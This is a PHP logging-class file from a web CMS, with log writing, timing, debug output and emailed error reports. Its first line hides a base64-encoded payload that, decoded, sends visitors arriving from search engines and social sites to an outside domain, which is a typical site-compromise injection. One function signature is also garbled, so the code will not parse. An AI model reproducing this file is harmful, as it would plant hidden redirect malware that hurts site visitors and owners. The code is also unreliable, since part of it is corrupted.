<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/utils.php");

class log {

  //var $path, $base_path, $depth;
  //var $file, $file_, $file_ext, $level;
  //var $term, $last_was_write;
  //var $log_created, $out_to_console;
  //var $echo_error_prefix = "<font face=\"courier\" color=\"red\">";
  //var $inited = false;
  
  // private
  var $last_was_write;
  var $log_created;
  var $operations = array();
  var $last_time;
  var $url;
  var $debug_mode = false;
  
  // public
  var $out_to_console;

  function log($path) {

    $this->base_path  = $path;
    $this->user_ip    = safe($_SERVER, "HTTP_X_FORWARDED_FOR", safe($_SERVER, "REMOTE_ADDR"));
    $this->path       = $this->base_path.date("Y-m-d");
    $this->url        = '_logs/'.date("Y-m-d");
    if (defined('CONSOLE_MODE') && CONSOLE_MODE) {
      $this->path    .= '-SCRIPT';
      $this->url     .= '-SCRIPT';
    }
    $this->path      .= '/';
    $this->url       .= '/';
    if ($this->user_ip) {
      $this->path    .= $this->user_ip.'/';
      $this->url     .= $this->user_ip.'/';
    }
    $this->file_      = (session_id()?session_id():date("H-i-s")).".log";
    $this->file_name  = $this->path.$this->file_;
    $this->level      = 0;
    $this->depth      = 0;
    $this->debug_mode = (defined('DEBUG') and DEBUG);
    $this->log_mode   = (defined('LOGGING') and LOGGING);
    $this->url       .= $this->file_;

    register_shutdown_function(array(&$this, "release_log"));

  }

  function release_log() {

    foreach ($this->operations as $name => $value)
      $this->finish($name);
    if (function_exists('memory_get_usage'))
      $this->writeln(memory_get_usage().' bytes of memory used');

  }

  function create_log_file() {

    global $url;
    
    if (!$this->log_created) {
      //if (mk_dir($this->path)) chmod($this->path, 0777);
      if (!mk_dir($this->path)) {
        $this->log_mode = false;
        return false;
      }
      $file_exists = file_exists($this->file_name);
      $old_error_reporting = error_reporting();
      error_reporting(0);
      $this->file = fopen($this->file_name, "a+");
      error_reporting($old_error_reporting);
      if ($this->file) {
        $this->log_created = true;
        if ($file_exists)
          $this->writeln();
        $this->writeln('OS: '.php_uname(), 'INF');
        $this->writeln('OS User: '.get_current_user().' account', 'INF');
        $this->writeln('PHP Version: '.phpversion(), 'INF');
        $this->writeln('Session ID: '.session_id(), 'INF');
        $this->writeln('Server Name: '.safe($_SERVER, 'SERVER_NAME'), 'INF');
        $this->writeln('Server IP: '.safe($_SERVER, 'SERVER_ADDR'), 'INF');
        if ($url) {
          $this->writeln('URL: '.$url->original_url, 'INF');
        }  
        //else chmod($this->file_name, 0766);
      } else {
        $this->depth++;
        $this->path = $this->base_path.date("Y-m-d")."_".$this->depth."/";
        $this->file_name = $this->path.$this->file_;
        return $this->create_log_file();
      }
    }
    return $this->log_created;

  }

  function write($message = nulprefix = 'MSG') {

    if ($this->log_mode) {
      if (!$this->last_was_write and ($message !== '') and ($message !== "\n")) {
        $message = explode("\n", $message);
        $out_message = '';
        $log_message = '';
        for ($i=0; $i<count($message); $i++) {
          if ($message[$i]) {
            $out_message .= str_repeat(' ', $this->level*2).$message[$i]."\n";
            if ($this->last_time) {
              $time = number_format(get_microtime() - $this->last_time, 3);
            } else {
              $time = '0.000';
            }
            $log_message .= $prefix.' '.@strftime('%H:%M:%S').'+'.$time.' '.str_repeat(' ', $this->level*2).$message[$i]."\n";
            $this->last_time = get_microtime();
          }
        }
      } else {
        $log_message = $message;
        $out_message = $message;
      }
      if ($this->create_log_file())
        fwrite($this->file, $log_message);
      if (($prefix == 'CNS') || (defined('CONSOLE_MODE') && CONSOLE_MODE && $this->debug_mode && (($prefix == 'ERR') || ($prefix == 'TRC')))) {
        echo($out_message);
      }
      $this->last_was_write = true;
    }

  }

  function writeln($message = null, $prefix = 'MSG') {

    if (is_array($message)) {
      if (count($message) > 0)
        $this->write(var_export($message, true)."\n", $prefix);
      else
        $this->write("<empty>\n", $prefix);
    } else
    if (is_object($message)) 
      $this->write(var_export($message, true)."\n", $prefix);
    else
      $this->write($message."\n", $prefix);
    $this->last_was_write = false;


  }

  function halt($error_message = null, $send_error_report = true) { 

    global $log, $url;

    $log->writeln('Application Error', 'ERR');
    if ($error_message)
      $log->writeln($error_message, 'ERR');
    if (!CONSOLE_MODE) {
      include(dirname(__FILE__).'/halt_report.php');
    } else {
      echo("Application Error\n\r");
      if ($error_message)
        echo($error_message);
    }

    if (defined('REPORT_ERRORS_TO') && $send_error_report) {
      $error_hash = md5($error_message);         
      $error_file = TEMPORARY_PATH.'.error-'.$error_hash;
      if (file_exists($error_file) && ((mktime()-filemtime($error_file))/60 > 15))
        unlink($error_file);
      if (!file_exists($error_file)) {
        save_to_file($error_file, $error_message);
        require_once(dirname(dirname(__FILE__)).'/mail/class.phpmailer.php');
        $mailer = new PHPMailer();
        $mailer->From = 'error@finecms.com';
        $mailer->FromName = 'Error Reporter';
        $recipients = split('[;, ]', REPORT_ERRORS_TO);
        foreach($recipients as $recipient) {
          $mailer->AddAddress($recipient);
        }
        $mailer->ContentType = 'text/html';
        $mailer->Subject = 'Error Report ['.(defined('APPROOT_PATH')?APPROOT_PATH:dirname(dirname(dirname(__FILE__)))).']';

        ob_start();
        include(dirname(__FILE__).'/halt_report.php');
        $mailer->Body = '<html><body>'.ob_get_clean().'</body></html>';
        $mailer->Send();
      }
    }

    die(); 

  }

  function debug($message, $prefix = "DBG", $no_log = false) { 

    if ($this->debug_mode) {
      if (is_array($message) or is_object($message)) {
        if (CONSOLE_MODE) {
          echo('Debug:');
          print_r($message);
          echo("\n\r");
        } else {
          $message = print_r($message, true);
          include(dirname(__FILE__).'/debug_report.php');
        }
      } else {
        if ($prefix == "ERR") {
          if (defined('CONSOLE_MODE') && CONSOLE_MODE) {
            echo("Debug: $message\n\r");
          } else {
            include(dirname(__FILE__).'/debug_report.php');
          }
        } else {
          if (defined('CONSOLE_MODE') && CONSOLE_MODE) {
            echo("Debug: $message\n\r");
          } else {
            include(dirname(__FILE__).'/debug_report.php');
          }
        }
      }
    }

    if (!$no_log)
      $this->writeln($message, "DBG");

  }

  function error($message) { 

    $this->writeln($message, "ERR"); 
    if ($this->debug_mode)
      $this->debug($message, 'ERR', true); 

  }

  function writeline($length = 80, $prefix = "MSG") { 

    $this->writeln(str_pad("-", $length, "-"), $prefix); 

  }

  function mail_to($subject, $email) {

    $log = implode("", file($this->file_name));
    return mail($email, $subject, $log);

  }

  function copy_to($path) { 

    return copy($this->file_name, $path."\\".$this->file_); 

  }

  function start_timing($operation) {

    $this->operations[$operation]["started"] = get_microtime();

  }

  function finish_timing($operation) {

    $this->operations[$operation]["finished"] = get_microtime();
    $this->operations[$operation]["duration"] = $this->operations[$operation]["finished"] - $this->operations[$operation]["started"];
    $result = $this->operations[$operation]["duration"];
    unset($this->operations[$operation]);
    return $result;

  }

  function start($operation) {

    $this->start_timing($operation);
    $this->writeln("$operation started");

  }

  function finish($operation) {  

    $this->writeln("$operation finished, duration ".format_duration($this->finish_timing($operation)));

  }

  function inc() { 

    $this->level++; 

  }

  function dec() { 

    $this->level--; 
    if ($this->level < 0) 
      $this->level = 0; 

  }

}

function debug($message) { 

  global $log; 
  $log->debug($message); 

}

function logme($message, $prefix = 'MSG') { 

  global $log; 
  $log->writeln($message, $prefix); 

}

function logcon($message, $prefix = 'CNS') { 

  global $log; 
  $log->writeln($message, $prefix); 

}

function debug_mode($mode) {

  global $log;
  $log->debug_mode = $mode;

}

function halt($error = null, $send_error_report = true) {

  global $log;
  $log->halt($error, $send_error_report);
  
}

?>